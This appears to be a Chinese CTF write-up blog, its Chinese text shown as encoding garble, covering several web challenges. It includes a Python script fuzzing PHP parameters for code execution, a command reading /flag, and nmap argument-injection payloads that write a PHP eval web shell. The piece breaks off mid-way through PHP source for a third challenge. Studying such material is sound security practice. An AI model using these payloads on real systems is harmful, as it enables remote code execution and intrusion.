<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/23d98d2c9a93b3e8a0e0f0676e8b0c2d.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e1d0cf566f69b2cb3dc6a760d7d2a594.png"></p>
<p>éƒ½æ˜¯è¿™ç§å½¢å¼çš„ï¼ˆ</p>
<p>æ‰¾ä¸€ä¸ªå­˜åœ¨çš„GET/POSTä¼ å‚å­</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e52154188acc">pythonå¤šçº¿ç¨‹-Semaphore(ä¿¡å·å¯¹è±¡) - ç®€ä¹¦</a></p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢(è€ƒå¯Ÿä»£ç ç¼–å†™èƒ½åŠ›)-CSDNåšå®¢</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os  <span class="token comment"># osï¼šç”¨äºæ“ä½œæ–‡ä»¶å’Œç›®å½•è·¯å¾„ã€‚</span>
<span class="token keyword">import</span> requests  <span class="token comment"># requestsï¼šå‘é€HTTPè¯·æ±‚ã€‚</span>
<span class="token keyword">import</span> re  <span class="token comment"># reï¼šæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œç”¨äºæå–å‚æ•°ã€‚</span>
<span class="token keyword">import</span> threading  <span class="token comment"># threadingï¼šå®ç°å¤šçº¿ç¨‹å¹¶å‘ã€‚</span>
<span class="token keyword">import</span> time  <span class="token comment"># timeï¼šè·å–å’Œå¤„ç†æ—¶é—´ä¿¡æ¯ã€‚</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å¼€å§‹æ—¶é—´ï¼š  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è®°å½•è„šæœ¬å¯åŠ¨æ—¶é—´ã€‚</span>
s1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°.æ§åˆ¶æœ€å¤§å¹¶å‘çº¿ç¨‹æ•°ä¸º100ï¼Œé˜²æ­¢èµ„æºè€—å°½ã€‚</span>
<span class="token triple-quoted-string string">"""ä¿¡å·é‡æ˜¯ä¸€ç§ç”¨äºæ§åˆ¶å¹¶å‘è®¿é—®èµ„æºçš„åŒæ­¥åŸè¯­ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œåœ¨å¤šçº¿ç¨‹ç¼–ç¨‹é‡Œï¼Œä¿¡å·é‡å¯ä»¥é™åˆ¶åŒæ—¶è®¿é—®æŸä¸ªèµ„æºæˆ–è€…æ‰§è¡ŒæŸæ®µä»£ç çš„çº¿ç¨‹æ•°é‡ã€‚å½“ä¸€ä¸ªçº¿ç¨‹æƒ³è¦è®¿é—®å—ä¿¡å·é‡ä¿æŠ¤çš„èµ„æºæ—¶ï¼Œå®ƒéœ€è¦å…ˆè·å–ä¿¡å·é‡ï¼›å½“çº¿ç¨‹ä½¿ç”¨å®Œèµ„æºåï¼Œéœ€è¦é‡Šæ”¾ä¿¡å·é‡ï¼Œè¿™æ ·å…¶ä»–çº¿ç¨‹æ‰æœ‰æœºä¼šè·å–ä¿¡å·é‡å¹¶è®¿é—®èµ„æºã€‚"""</span>
filePath <span class="token operator">=</span> <span class="token string">r"D:\phpstudy_pro\WWW\src"</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># æ”¹å˜å½“å‰çš„è·¯å¾„</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥.å¢å¼ºç½‘ç»œè¯·æ±‚çš„å¥å£®æ€§ã€‚</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># è·å–ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalseã€‚ç¦ç”¨Keep-Aliveä»¥é¿å…è¿æ¥æ± é—®é¢˜ã€‚</span>


<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># è·å–ä¿¡å·é‡ï¼Œæ§åˆ¶å¹¶å‘</span>
    <span class="token triple-quoted-string string">"""ä¿¡å·é‡è®¡æ•°å™¨å¤§äº 0ï¼šå¦‚æœå½“å‰ä¿¡å·é‡çš„è®¡æ•°å™¨å¤§äº 0ï¼Œè¯´æ˜è¿˜æœ‰å¯ç”¨çš„èµ„æºï¼Œçº¿ç¨‹ä¼šæˆåŠŸè·å–ä¿¡å·é‡ï¼ŒåŒæ—¶ä¿¡å·é‡çš„è®¡æ•°å™¨ä¼šå‡ 1ã€‚ä¾‹å¦‚ï¼Œè‹¥åˆå§‹è®¡æ•°å™¨å€¼ä¸º 100ï¼Œä¸€ä¸ªçº¿ç¨‹æˆåŠŸè·å–ä¿¡å·é‡åï¼Œè®¡æ•°å™¨å˜ä¸º 99ã€‚
ä¿¡å·é‡è®¡æ•°å™¨ç­‰äº 0ï¼šå¦‚æœå½“å‰ä¿¡å·é‡çš„è®¡æ•°å™¨ä¸º 0ï¼Œæ„å‘³ç€å·²ç»æ²¡æœ‰å¯ç”¨çš„èµ„æºäº†ï¼Œæ­¤æ—¶çº¿ç¨‹ä¼šè¢«é˜»å¡ï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°æœ‰å…¶ä»–çº¿ç¨‹é‡Šæ”¾ä¿¡å·é‡ï¼Œä½¿å¾—è®¡æ•°å™¨çš„å€¼å¤§äº 0ï¼Œè¯¥çº¿ç¨‹æ‰æœ‰æœºä¼šè·å–ä¿¡å·é‡å¹¶ç»§ç»­æ‰§è¡Œã€‚"""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">'     '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># æ‰“å°æ—¥å¿—ï¼šè¾“å‡ºå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶å’Œæ—¶é—´ã€‚</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span>
        gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># æ­£åˆ™åŒ¹é…ï¼šä»PHPä»£ç ä¸­æå–æ‰€æœ‰$_GET['param']å’Œ$_POST[</span>
        <span class="token comment"># 'param']çš„å‚æ•°åã€‚list() å‡½æ•°å¯ä»¥ç¡®ä¿ç»“æœæ˜¯ä¸€ä¸ªåˆ—è¡¨ç±»å‹</span>
        <span class="token triple-quoted-string string">"""re.findall() æ˜¯ re æ¨¡å—ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„å­å­—ç¬¦ä¸²ï¼Œå¹¶å°†è¿™äº›åŒ¹é…ç»“æœä»¥åˆ—è¡¨çš„å½¢å¼è¿”å›ã€‚å®ƒçš„åŸºæœ¬è¯­æ³•æ˜¯ re.findall(pattern, 
        string)ï¼Œå…¶ä¸­ pattern æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œstring æ˜¯è¦æœç´¢çš„å­—ç¬¦ä¸²"""</span>
        posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># æ‰€æœ‰çš„$_POST</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># æ‰€æœ‰çš„$_GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>  <span class="token comment"># ä¸ºæ¯ä¸ªGET/POSTå‚æ•°èµ‹å€¼echo 'hahahahahah';ï¼Œç”¨äºæ£€æµ‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚å¦‚æœå‚æ•°å€¼è¢«ç›´æ¥æ‰§è¡Œï¼Œå“åº”ä¸­ä¼šåŒ…å«xxxxxxã€‚</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>
    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span> <span class="token operator">+</span> <span class="token builtin">file</span>
    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>  <span class="token comment"># ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
    <span class="token comment"># print(content)</span>
    <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>  <span class="token comment"># å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span>
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>  <span class="token comment"># å¦‚æœåœ¨GETå‚æ•°ä¸­æ‰¾åˆ°ï¼Œflag=1ï¼Œå¦åˆ™æ£€æŸ¥POSTã€‚</span>
            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
                url <span class="token operator">+</span> <span class="token string">'?%s='</span> <span class="token operator">%</span> a <span class="token operator">+</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">)</span>  <span class="token comment"># %s æ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œä¼šè¢«å˜é‡ a çš„å€¼æ›¿æ¢ã€‚http://127.0.0.1/src/your_file.php</span>
            <span class="token comment"># ?param1=echo 'hahahahahah';</span>
            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
            <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment"># {'param': "echo 'hahahahahah';"}</span>
                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
                <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span>
            param <span class="token operator">=</span> a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">=</span> b
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">"  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s"</span> <span class="token operator">%</span> param<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ç»“æŸæ—¶é—´ï¼š  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>  <span class="token comment"># åŠ å…¥å¤šçº¿ç¨‹</span>
    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token triple-quoted-string string">"""threading.Thread() æ˜¯ threading æ¨¡å—ä¸­ç”¨äºåˆ›å»ºçº¿ç¨‹å¯¹è±¡çš„ç±»ã€‚
target=get_contentï¼šæŒ‡å®šçº¿ç¨‹è¦æ‰§è¡Œçš„ç›®æ ‡å‡½æ•°ï¼Œå³ get_content å‡½æ•°ã€‚å½“çº¿ç¨‹å¯åŠ¨åï¼Œä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥å®Œæˆå…·ä½“çš„ä»»åŠ¡ã€‚
args=(i,)ï¼šä¼ é€’ç»™ç›®æ ‡å‡½æ•°çš„å‚æ•°ã€‚args æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¿™é‡Œå°†å½“å‰æ–‡ä»¶åç§° i ä½œä¸ºå‚æ•°ä¼ é€’ç»™ get_content å‡½æ•°ã€‚æ³¨æ„ï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿéœ€è¦å†™æˆå…ƒç»„çš„å½¢å¼ï¼Œåé¢çš„é€—å·ä¸èƒ½çœç•¥ã€‚"""</span>
    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># è°ƒç”¨çº¿ç¨‹å¯¹è±¡ t çš„ start() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå¯åŠ¨çº¿ç¨‹å¹¶å¼€å§‹æ‰§è¡Œ target æŒ‡å®šçš„å‡½æ•°ï¼ˆå³ get_content</span>
    <span class="token comment"># å‡½æ•°ï¼‰ã€‚çº¿ç¨‹ä¼šåœ¨åå°ç‹¬ç«‹è¿è¡Œï¼Œä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹çš„æ‰§è¡Œï¼Œä»è€Œå®ç°å¤šçº¿ç¨‹å¹¶å‘å¤„ç†å¤šä¸ªæ–‡ä»¶çš„ç›®çš„ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96c3955e1ad9562ad539e67f736eeda9.png"></p>
<pre class="line-numbers language-none"><code class="language-none">/xk0SzyKwfzw.php?Efa5BVG=cat /flag
flag{ed497ec8-a905-4882-9f8b-bb22ffd3c9e7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è¿˜æœ‰å°±æ˜¯è¦æ³¨æ„echoçš„çº¿ç´¢è¦å°å°ä¼—äº›ï¼Œä¸ç„¶ä¼šå‡ºç°ä¸€å †å¯è¡Œçš„ï¼ˆ</p>
<hr>
<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7c69f9df7ebc863df09abd77bddd0b3f.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Warning: simplexml_load_file(): I/O warning : failed to load external entity "xml/34234" in /var/www/html/result.php on line 23
Wrong file name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HOsystem/p/16538678.html">Nmap æ“ä½œæ‰‹å†Œ - å®Œæ•´ç‰ˆ - HOsystem - åšå®¢å›­</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yankaohaitaiwei/p/11593970.html">ã€æ¸—é€æµ‹è¯•å°ç™½ç³»åˆ—ã€‘ä¹‹ç›®å½•æ‰«æã€Nmapçš„ä½¿ç”¨åŠä½¿ç”¨Metasploité€šè¿‡MS17-010è·å–ç³»ç»Ÿæƒé™ - Woori - åšå®¢å›­</a></p>
<p>æ¥å¯¹æ¯”ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f48b3048b506f7be115558352aea1c1f.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/252d6fc0ab7cbcbd088efafd0c777eb5.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/088dcf83226ababff6ce04be14945ccf.png"></p>
<p>å¾ˆæ˜æ˜¾å‰ä¸¤æ›´åƒï¼ŒTCP+balabalaâ€¦</p>
<p>æ•…ä¸ºnmap+IPå½¢å¼</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">nmap -iL filename æ‰«æç›®æ ‡æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>-oN / -oX / -oS / -oG ï¼šæ­£å¸¸è¾“å‡ºæ‰«æï¼ŒXMLï¼Œs | &lt;rIpt kIddi3 å’ŒGrepableæ ¼å¼ï¼Œåˆ†åˆ«ä¸ºç»™å®šçš„æ–‡ä»¶åï¼›</li>
<li>-oA ï¼šä¸€æ¬¡è¾“å‡ºä¸‰ç§ä¸»è¦æ ¼å¼ï¼›</li>
<li>nmap -oG <output_file> [å…¶ä»–æ‰«æå‚æ•°] &lt;ç›®æ ‡ä¸»æœºæˆ–ç½‘ç»œ&gt;</output_file></li>
</ul>
</blockquote>
<p>ä¸€ç§æ˜¯é…±ï¼Œå‚è€ƒ[BUUCTF 2018]Online Tool[<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">æµ…è°ˆescapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/æµ…è°ˆescapeshellargä¸å‚æ•°æ³¨å…¥/#escapeshellarg</a></p>
<pre class="line-numbers language-none"><code class="language-none">127.0.0.1' -iL /flag -oN xa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®xaâ€™</p>
<p>ä½†æ„Ÿè§‰ä¸é è°±,æˆ‘åˆä¸é€ æºä»£ç é‡Œæœ‰escapeshllargä»€ä¹ˆçš„ï¼ˆ</p>
<p>åŸæ¥nmapå¯èƒ½å’Œescapeshellarg()ä¸escapeshellcmd()é…åˆä½¿ç”¨ï¼Œé‚£æ²¡äº‹äº†</p>
<p>å“‡å“¦ï¼ï¼ï¼ï¼é‚£ä»¥ånmapå°±é è¿™æ–¹é¢äº†ã€‚è¿™ä¸¤é“é¢˜éƒ½æ˜¯ä¸€ä¸ªç±»å‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17705836.html">nmapå’Œescapeshellarg()å‡½æ•°ã€escapeshellcmd()å‡½æ•°çš„RCEä½¿ç”¨ - Eddie_Murphy - åšå®¢å›­</a></p>
<p>é‚æŠŠé‚£é¢˜çš„payloadæ¬è¿‡æ¥<code>' ã€Š?php @eval($_POST["pass"]);?&gt; -oG pass.php '</code></p>
<p><del>ç»“æœè¯´æˆ‘æ˜¯Hacker(bushi</del></p>
<p>è¯•äº†ä¸€ä¼šå„¿ï¼Œå¥½åƒæ˜¯æŠŠphpç»™banäº†</p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46607055/article/details/120076797">æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadâ€”â€”phpçŸ­æ ‡ç­¾-CSDNåšå®¢</a>æ‰¾è§äº†å–µ~</p>
<blockquote>
<p>phpçŸ­æ ‡ç­¾</p>
<!--? echo '123';?--><p>  #å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on<br><!--?=(è¡¨è¾¾å¼)?-->  ç­‰ä»·äº <!--?php echo (è¡¨è¾¾å¼)?-->  #ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®<br>&lt;% echo â€˜123â€™;%&gt;   #å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œå¹¶ä¸”åªèƒ½åœ¨7.0ä»¥ä¸‹ç‰ˆæœ¬ä½¿ç”¨</p>
<script language="php">echo '123'; </script> #ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚

</blockquote>
<p>é‚ç”¨çŸ­æ ‡ç­¾=&gt;<code>' ã€Š? @eval($_POST["pass"]);?&gt; -oG pass.phtml '</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8f33f11801e63936ef912af978302d92.png"></p>
<p>okk~</p>
<hr>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p><del>è¹¦å‡ºæ¥ä¸ªå¤§äºŒç»´ç å“æ­»æˆ‘äº†å•Šå•Šå•Šå•Šå•Šå•Š</del></p>
<p><del>è€Œä¸”æŠ¥çš„æ—¶é—´æ˜¯é”™çš„å–µ</del></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>ç™¾ä¸‡å‰ç«¯çš„<span class="token constant">NPU</span>æŠ¥æ—¶ä¸­å¿ƒä¸ºæ‚¨æŠ¥æ—¶ï¼š<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"./time.php?source"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token constant">SCRIPT</span> language<span class="token operator">=</span>javascript<span class="token operator">&gt;</span>
<span class="token keyword">function</span> <span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
theTime <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"runClock()"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> today <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> display<span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>status<span class="token operator">=</span><span class="token string">""</span><span class="token operator">+</span>display<span class="token operator">+</span><span class="token string">"î¼å¤§é»‘é˜”HELEN"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token comment">#error_reporting(0);</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">;</span>
